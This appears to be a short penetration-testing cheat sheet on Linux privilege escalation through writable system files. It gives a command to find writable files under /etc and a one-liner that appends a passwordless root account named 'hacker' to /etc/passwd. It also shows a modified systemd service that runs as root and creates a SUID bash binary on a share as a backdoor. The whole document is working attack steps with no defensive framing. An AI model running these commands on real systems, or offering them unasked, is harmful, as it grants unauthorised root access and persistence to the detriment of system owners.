
# Writable System Files

## Enumerating

```
find /etc -writable 2>/dev/null
```

## /etc/passwd

```
[michael@snookums ~]$ find /etc -writable 2>/dev/null
/etc/passwd
```

This command creates an hacker account with root rights.

```
echo "hacker::0:0:Hacker:/root:/bin/bash" >> /etc/passwd
```

Logging into root acc.

```
su hacker
```

## Random System File which executes an certain command after restart.

checks for system files which are writable, if they have higher privs
we can potentially exploit them.

```
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'cp /bin/bash /mnt/secret-share/bash;chmod u+s /mnt/secret-share/bash'

[Install]
WantedBy=multi-user.target

in this file I implemented an bash SUID binary in the user file system, since we did not have access
to /tmp, but in our own share we can also create and write files.
```